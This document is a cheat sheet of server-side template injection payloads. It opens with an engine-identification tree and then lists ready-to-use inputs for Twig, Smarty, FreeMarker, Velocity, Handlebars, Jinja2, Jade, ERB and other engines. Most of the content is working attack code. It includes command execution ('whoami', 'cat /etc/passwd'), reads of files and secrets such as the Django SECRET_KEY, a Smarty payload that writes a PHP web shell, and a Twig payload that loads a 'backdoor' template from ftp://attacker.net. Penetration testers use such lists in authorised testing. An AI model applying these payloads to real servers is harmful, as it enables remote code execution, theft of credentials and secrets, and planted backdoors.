# Tips for Server-side template injection

## How to identify SSTI

```
                           ----------
                           | ${7*7} |
                           ----------
                           /       \
                          /         \
           -----------------      ---------------
           | a{*comment*}b |      |   {{7*7}}   |
           -----------------      ---------------
          /        |                    |      \
         /         |                    |       \
----------  ---------------------   -----------   ------------------
| Smarty |  | ${"z".join("ab")} |   | {{7*7}} |   | Not vulnerable |
----------  ---------------------   -----------   ------------------
                 /    \            /     |     \
                /      \          /      |      \
         --------   --------------   --------   ----------
         | Mako |   |   Unknown  |   | Twig |   | Jinja2 |              
         --------   --------------   --------   ----------

```

## Cheatsheet
```
-------------------------------------------------------------------
Polyglot:
${{<%[%'"}}%\
-------------------------------------------------------------------
FreeMarker (Java):
${7*7} = 49
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
--------------------------------------------------------------------
(Java):
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
${T(java.lang.System).getenv()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
--------------------------------------------------------------------
Twig (PHP):
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
--------------------------------------------------------------------
Smarty (PHP):
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
-------------------------------------------------------------------
Handlebars (NodeJS):
wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
-------------------------------------------------------------------
Velocity:
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
-------------------------------------------------------------------
ERB (Ruby):
<%= system("whoami") %>
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
-------------------------------------------------------------------
Django Tricks (Python):
{% debug %}
{{settings.SECRET_KEY}}
--------------------------------------------------------------------
Tornado (Python):
{% import foobar %} = Error
{% import os %}{{os.system('whoami')}}
--------------------------------------------------------------------
Mojolicious (Perl):
<%= perl code %>
<% perl code %>
-------------------------------------------------------------------
Flask/Jinja2: Identify:
{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}}
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
-------------------------------------------------------------------
Flask/Jinja2: 
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
--------------------------------------------------------------------
Jade:
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
--------------------------------------------------------------------
Razor (.Net):
@(1+2)
@{// C# code}
--------------------------------------------------------------------
```